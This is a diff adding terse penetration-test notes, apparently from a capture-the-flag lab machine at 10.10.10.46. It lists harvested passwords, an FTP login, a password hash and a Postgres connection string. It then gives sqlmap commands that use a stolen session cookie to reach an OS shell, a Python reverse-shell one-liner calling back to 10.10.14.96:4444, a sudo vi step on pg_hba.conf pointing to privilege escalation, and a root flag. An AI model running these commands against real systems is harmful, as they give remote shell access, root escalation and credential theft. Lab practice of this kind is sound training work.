@@ -1,0 +1,14 @@
+password: MEGACORP_4dm1n!!
+ftp cred: <user>ftpuser</user>
+         <password>mc@F1l3ZilL4</password>
+backup zip password: 741852963
+page login md5:2cb42f8734ea607eefed3b70af13bbd3
+pass:qwerty789
+sudo sqlmap -u "http://10.10.10.46/dashboard.php?search=y" --cookie="PHPSESSID=jvg4p8l7284oh8eikk49r8bgmq" 
+sudo sqlmap -u "http://10.10.10.46/dashboard.php?search=y" --cookie="PHPSESSID=jvg4p8l7284oh8eikk49r8bgmq" --os-shell
+which python3
+export RHOST="10.10.14.96";export RPORT=4444;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
+
+$conn = pg_connect("host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!");
+sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
+root flag: dd6e058e814260bc70e9bbdef2715849
